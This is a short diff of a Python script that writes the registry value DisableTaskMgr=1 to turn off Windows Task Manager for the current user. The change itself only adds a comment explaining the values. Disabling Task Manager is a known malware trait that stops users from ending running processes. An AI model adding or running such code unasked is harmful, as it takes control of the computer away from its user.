@@ -21,7 +21,7 @@ print("Internet connection established.")
 import winreg
 key_path = r'Software\Microsoft\Windows\CurrentVersion\Policies\System'
 value_name = 'DisableTaskMgr'
-value_data = 1
+value_data = 1 # 0=enable, 1=disable
 key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
 winreg.SetValueEx(key, value_name, 0, winreg.REG_DWORD, value_data)
 winreg.CloseKey(key)
